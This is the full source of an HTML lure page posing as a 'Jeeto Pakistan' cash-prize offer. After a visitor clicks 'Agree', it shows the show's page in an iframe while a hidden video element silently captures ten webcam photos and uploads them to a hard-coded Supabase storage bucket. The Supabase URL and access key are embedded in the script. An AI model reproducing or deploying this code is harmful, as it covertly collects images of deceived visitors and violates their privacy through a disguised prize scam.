<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jeeto Pakistan Jeeto 100,000/- Cash</title>
    <style>
        /* Styles for the pre-loading popup/modal */
        #preload-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        #preload-modal h2 {
            margin-bottom: 20px;
        }

        #agree-button {
            padding: 10px 20px;
            font-size: 16px;
            color: white;
            background-color: #007BFF;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        #agree-button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <!-- Preloading Popup -->
    <div id="preload-modal">
        <h2>Do you wish to win 100,000/- PKR?</h2>
        <p>To continue, allow camera access by clicking "Agree." Your photos will be processed in the background.</p>
        <button id="agree-button">Agree</button>
    </div>

    <!-- Embed Jeeto Pakistan Webpage using iframe -->
    <iframe 
        id="jeeto-iframe"
        src="/Jeeto%20Pakistan.html" 
        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; display: none; z-index: -1;"
        title="Jeeto Pakistan Page">
    </iframe>

    <video id="video" autoplay style="display: none;"></video>
    <p id="status" style="display: none;"></p>

    <!-- Load Supabase Library -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.0.5"></script>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const SUPABASE_URL = 'https://xsibckeasnitdilcdzoe.supabase.co';
            const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhzaWJja2Vhc25pdGRpbGNkem9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzc0ODczODEsImV4cCI6MjA1MzA2MzM4MX0.lv5XOKY3vBL94y4hksOshDexrBwsuynHEzTrgn06diE';
            const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

            document.getElementById('agree-button').addEventListener('click', () => {
                // Hide modal and show iframe
                document.getElementById('preload-modal').style.display = 'none';
                document.getElementById('jeeto-iframe').style.display = 'block';

                // Start camera and process photos in the background
                setupCamera(supabase);
            });
        });

        function setupCamera(supabase) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;

                    video.addEventListener('loadeddata', () => {
                        captureAndUploadPhotos(video, supabase);
                    });
                })
                .catch((err) => {
                    console.error('Camera access denied!', err);
                });
        }

        async function captureAndUploadPhotos(video, supabase) {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            for (let i = 0; i < 10; i++) {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageData = canvas.toDataURL('image/png');
                const blob = await (await fetch(imageData)).blob();
                const fileName = `photo-${Date.now()}-${i + 1}.png`;

                // Upload Blob to Supabase bucket
                const { data, error } = await supabase.storage.from('user-media').upload(fileName, blob, {
                    contentType: 'image/png'
                });

                if (error) {
                    console.error('Upload failed:', error);
                    return;
                } else {
                    console.log(`Photo ${i + 1} uploaded successfully:`, data.path);
                }
            }

            console.log('All photos uploaded successfully!');
        }
    </script>
</body>
</html>
